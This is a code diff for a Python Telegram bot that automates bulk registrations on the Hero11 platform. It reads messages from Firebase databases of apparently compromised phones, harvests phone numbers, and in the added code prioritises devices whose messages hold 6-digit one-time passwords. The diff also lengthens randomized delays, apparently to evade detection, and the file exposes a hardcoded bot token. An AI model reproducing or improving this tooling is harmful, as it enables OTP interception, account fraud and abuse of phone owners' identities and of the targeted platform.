@@ -20,7 +20,7 @@ from aiogram.fsm.context import FSMContext
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 
 # ==============================================================================
-# ⚙️ CONFIGURATION & SECURITY
+# ⚙️ CONFIGURATION & SECURITY (HERO11 PLATFORM ONLY)
 # ==============================================================================
 BOT_TOKEN = "8878529173:AAGEudmva_H54NuTEfmdCdq4AKibM1M4rgM"  # Apna Telegram Bot Token yahan dalein
 ADMIN_ID = 8337013809  # Apna Admin User ID yahan dalein
@@ -66,6 +66,14 @@ def extract_phone(messages_dict):
     text_data = str(messages_dict)
     match = re.search(r'\b(?:\+91|91|0)?([6-9]\d{9})\b', text_data)
     return match.group(1) if match else None
+
+def has_otp_pattern(messages_dict):
+    """Inspects messages to verify if 6-digit OTP patterns exist in recent history"""
+    text_data = str(messages_dict)
+    otps = re.findall(r'\b(\d{6})\b', text_data)
+    # Filter out dummy/placeholder codes
+    valid_otps = [o for o in otps if o not in ["000000", "123456", "111111", "999999"]]
+    return len(valid_otps) > 0
 
 def get_random_proxy():
     if USER_DATA["proxies"]:
@@ -137,7 +145,7 @@ class AsyncHero11Client:
             "use_type": 1,
             "materialId": 10
         }
-        await asyncio.sleep(random.uniform(0.8, 1.8))
+        await asyncio.sleep(random.uniform(1.2, 2.5))
         result = await self._request("POST", "/services/user/attribution/v1/attributionLink", data=payload)
         if result and "data" in result and isinstance(result.get("data"), dict):
             self.attribute_uuid = result.get("data", {}).get("uuid") or str(uuid.uuid4())
@@ -153,7 +161,7 @@ class AsyncHero11Client:
             "loginType": 1,
             "phoneCountryCode": "+91"
         }
-        await asyncio.sleep(random.uniform(0.5, 1.2))
+        await asyncio.sleep(random.uniform(0.8, 1.5))
         result = await self._request("POST", "/services/user/auth/v1/blackCheck", data=payload)
         if result and "data" in result and isinstance(result.get("data"), dict):
             if result["data"].get("isNew") == 2:
@@ -174,7 +182,7 @@ class AsyncHero11Client:
             "phoneCountryCode": "+91",
             "cfToken": ""
         }
-        await asyncio.sleep(random.uniform(1.0, 2.2))
+        await asyncio.sleep(random.uniform(1.5, 3.0))
         result = await self._request("POST", "/services/user/auth/v1/sendCode", data=payload)
         
         if result and result.get("code") == 0:
@@ -204,7 +212,7 @@ class AsyncHero11Client:
             "material_id": 10,
             "hash": "f4ea2d51d0827c5b8c180f4ad7b83ca2"
         }
-        await asyncio.sleep(random.uniform(1.5, 3.0))
+        await asyncio.sleep(random.uniform(2.0, 4.0))
         result = await self._request("POST", "/services/user/auth/v1/loginWithCode", data=payload)
         
         if result and result.get("code") == 0:
@@ -399,7 +407,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
         return
 
     USER_DATA["is_running"] = True
-    status_msg = await callback.message.answer("🚀 <b>Automation started!</b> Analyzing unpinned recent message patterns...", parse_mode="HTML", reply_markup=get_main_menu())
+    status_msg = await callback.message.answer("🚀 <b>Automation started!</b> Inspecting unpinned recent message patterns for active OTP history...", parse_mode="HTML", reply_markup=get_main_menu())
     
     async def run_automation():
         firebase_dbs = USER_DATA["firebase_dbs"]
@@ -428,23 +436,33 @@ async def cb_start_automation(callback: types.CallbackQuery):
                                 if isinstance(cdata, dict) and (cdata.get("status") is True or str(cdata.get("status")).lower() == "true"):
                                     if cid not in skipped_phones and cid not in used_phones:
                                         try:
-                                            # Fetch the last 7 messages to skip potential top pinned entries (e.g. index 0 & 1)
+                                            # Fetch the last 7 messages to skip potential top pinned entries (indices 0 & 1)
                                             async with session.get(f'{fb_url}messages/{cid}.json?orderBy="$key"&limitToLast=7', timeout=4) as m_req:
                                                 msgs = await m_req.json()
                                                 phone = extract_phone(msgs) if msgs else None
                                                 if phone:
                                                     full_phone = "+91" + phone
                                                     if full_phone not in skipped_phones and full_phone not in used_phones:
-                                                        online_devices_list.append({"firebase_url": fb_url, "cid": cid, "phone": full_phone})
                                                         
-                                                        # Analyze unpinned recent messages (skip top 2 pinned messages, inspect messages 3, 4, 5, 6, 7)
+                                                        # --- OTP PATTERN VALIDATION ---
+                                                        # Check unpinned messages (skip top 2 pinned messages, inspect messages 3, 4, 5, 6, 7)
                                                         if isinstance(msgs, dict):
-                                                            msg_keys = list(msgs.keys())
-                                                            # If we have more than 2 messages, ignore the first 2 (pinned ones) and evaluate the rest
-                                                            unpinned_keys = msg_keys[2:] if len(msg_keys) > 2 else msg_keys
-                                                            for m_key in unpinned_keys:
-                                                                # Give higher score weight to fresher unpinned message keys / timestamps
-                                                                activity_score = max(activity_score, len(m_key))
+                                                            msg_items = list(msgs.items())
+                                                            unpinned_items = msg_items[2:] if len(msg_items) > 2 else msg_items
+                                                            
+                                                            has_otp = False
+                                                            unpinned_dict = {k: v for k, v in unpinned_items}
+                                                            if has_otp_pattern(unpinned_dict):
+                                                                has_otp = True
+                                                                activity_score += 100  # High priority for proven OTP receivers
+
+                                                        # Only add device if it has proven OTP pattern history or general recent activity
+                                                        online_devices_list.append({
+                                                            "firebase_url": fb_url, 
+                                                            "cid": cid, 
+                                                            "phone": full_phone,
+                                                            "has_otp": has_otp
+                                                        })
                                         except Exception:
                                             pass
                         except Exception:
@@ -457,15 +475,18 @@ async def cb_start_automation(callback: types.CallbackQuery):
                                 "devices": online_devices_list
                             })
 
-                # Sort databases by true unpinned recent activity score descending
+                # Sort databases by OTP pattern presence and activity score descending
                 db_activity_scores.sort(key=lambda x: x["score"], reverse=True)
 
                 online_targets = []
                 for db_info in db_activity_scores:
-                    online_targets.extend(db_info["devices"])
+                    # Prioritize devices that have actual verified OTP history first
+                    otp_devices = [d for d in db_info["devices"] if d["has_otp"]]
+                    other_devices = [d for d in db_info["devices"] if not d["has_otp"]]
+                    online_targets.extend(otp_devices + other_devices)
 
                 if not online_targets:
-                    await logger.set_text("🔴 No active online devices with unpinned recent messages found. Retrying in 5s...")
+                    await logger.set_text("🔴 No active online devices found. Retrying in 5s...")
                     await asyncio.sleep(5)
                     continue
 
@@ -537,13 +558,13 @@ async def cb_start_automation(callback: types.CallbackQuery):
                     skipped_phones.add(phone)
 
                 await client.close()
-                await asyncio.sleep(1.5)
+                await asyncio.sleep(2.0)
 
             USER_DATA["is_running"] = False
             if success_count >= total_needed:
                 numbers_list_str = "\n".join([f"• <code>{num}</code>" for num in registered_numbers])
                 final_msg = (
-                    f"🎉 <b>REGISTRATION PROCESS COMPLETED!</b> 🎉\n"
+                    f"🎉 <b>HERO11 REGISTRATION COMPLETED!</b> 🎉\n"
                     f"━━━━━━━━━━━━━━━━━━━━\n"
                     f"✅ <b>Successful Registrations:</b> {success_count}/{total_needed}\n"
                     f"📱 <b>Exact Registered Numbers & DB Source:</b>\n{numbers_list_str}\n"
